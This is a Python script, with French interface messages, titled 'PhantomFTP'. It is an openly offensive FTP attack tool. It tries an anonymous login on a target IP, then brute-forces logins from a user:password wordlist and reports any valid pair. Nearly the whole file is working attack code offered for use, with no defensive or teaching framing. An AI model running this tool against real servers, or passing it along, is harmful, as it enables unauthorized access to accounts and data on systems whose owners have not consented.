#!/usr/bin/python3.9

from termcolor import colored
import ftplib #Connexion FTP
import os

prompt = "°O(PhantomFTP)O° > "

def bruteforce(host, mdp):
	try:
		fichier = open(mdp, "r")
	except:
		print(colored("[ERREUR] Le fichier "+mdp+" n'existe pas! ", "red"))

	for ligne in fichier.readlines():
		user = ligne.split(':')[0]
		password = ligne.split(':')[1].strip("\n")
		print(colored(prompt+"Essai de la combinaison ["+user+" - "+password+"]...", "yellow"))
		try:
			ftp = ftplib.FTP(host, timeout=0.1)
			ftp.login(user, password)
			print(colored(prompt+"COMBINAISON VALIDE: ["+user+" - "+password+"] !!","green"))
			ftp.quit()
			return(user, password)
		except:
			pass

def anonymousLogin(host):
	print(colored("\n"+prompt+"Essai d'attaque par anonymous login...", "yellow"))
	try:
		ftp = ftplib.FTP(host)
		ftp.login("anonymous", "anonymous")
		print(colored(prompt+"ATTAQUE ANONYMOUS REUSSIE !\n", "green"))
		return True
	except:
		print(colored(prompt+"Attaque anonymous échouée...\n","red"))
		return False

def main():
	host = input(prompt+"Entrez l'IP: ")
	mdp_fichier = input(prompt+"Entrez le fichier contenant des user:password: ")
	anonymousLogin(host)

	bruteforce(host, mdp_fichier)

	print("\n")

os.system("clear")
print("▄▀▀▄▀▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▄   ▄▀▀▄ ▀▄  ▄▀▀▀█▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▄▀▄      ▄▀▀▀█▄    ▄▀▀▀█▀▀▄  ▄▀▀▄▀▀▀▄\n"+
     "█   █   █ █  █   ▄▀ ▐ ▄▀ ▀▄ █  █ █ █ █    █  ▐ █      █ █  █ ▀  █     █  ▄▀  ▀▄ █    █  ▐ █   █   █\n"+
     "▐  █▀▀▀▀  ▐  █▄▄▄█    █▄▄▄█ ▐  █  ▀█ ▐   █     █      █ ▐  █    █     ▐ █▄▄▄▄   ▐   █     ▐  █▀▀▀▀\n"+
     "   █         █   █   ▄▀   █   █   █     █      ▀▄    ▄▀   █    █       █    ▐      █         █\n"+
     " ▄▀         ▄▀  ▄▀  █   ▄▀  ▄▀   █    ▄▀         ▀▀▀▀   ▄▀   ▄▀        █         ▄▀        ▄▀\n"+
     "█          █   █    ▐   ▐   █    ▐   █                  █    █        █         █         █\n"+
     "▐          ▐   ▐            ▐        ▐                  ▐    ▐        ▐         ▐         ▐       \n")

print(colored("\t\t\tFTP Bruteforce (& Anonymous login) by b64-Sm9yZGFuIExBSVJFUw\n\n", "yellow"))
main()

